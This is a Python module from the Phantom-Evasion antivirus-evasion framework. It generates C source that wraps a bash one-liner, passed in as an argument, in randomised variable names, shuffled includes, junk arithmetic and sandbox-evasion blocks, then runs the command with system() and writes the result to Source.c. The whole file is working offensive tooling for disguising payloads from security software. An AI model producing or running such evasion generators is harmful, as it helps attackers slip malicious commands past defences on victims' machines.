
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
from random import shuffle  
sys.path.append("Modules/payloads/auxiliar")
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import CheckForBackslash
from usefull import generic_evasion

BashOneliner = CheckForBackslash(sys.argv[1])

Randvarname = varname_creator()

Randptr = varname_creator()

# Random Junkcode 

Junkcode_01 = Junkmathinject()	       
Junkcode_02 = Junkmathinject()		
Junkcode_03 = Junkmathinject()		
Junkcode_04 = Junkmathinject()		
Junkcode_05 = Junkmathinject()		
Junkcode_06 = Junkmathinject()		
Junkcode_07 = Junkmathinject()		
Junkcode_08 = Junkmathinject()		

MorphEvasion1 = generic_evasion()
MorphEvasion2 = generic_evasion()
MorphEvasion3 = generic_evasion()
MorphEvasion4 = generic_evasion()

Hollow_code = ""

Include_List = ["#include <stdlib.h>\n","#include <unistd.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <sys/mman.h>\n","#include <math.h>\n"]

shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode_01
Hollow_code += MorphEvasion1
Hollow_code += MorphEvasion2
Hollow_code += MorphEvasion3
Hollow_code += MorphEvasion4
Hollow_code += "void *" + Randptr + ";"
Hollow_code += Junkcode_02
Hollow_code += "char " + Randvarname + "[] = \"" + BashOneliner + "\";\n"
Hollow_code += Junkcode_03
Hollow_code += Junkcode_04
Hollow_code += "system(" + Randvarname + ");\n"
Hollow_code += "}else{" + Junkcode_05 + "}\n"
Hollow_code += "}else{" + Junkcode_06 + "}\n"
Hollow_code += "}else{" + Junkcode_07 + "}\n"
Hollow_code += Junkcode_08 + "}\n"
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)

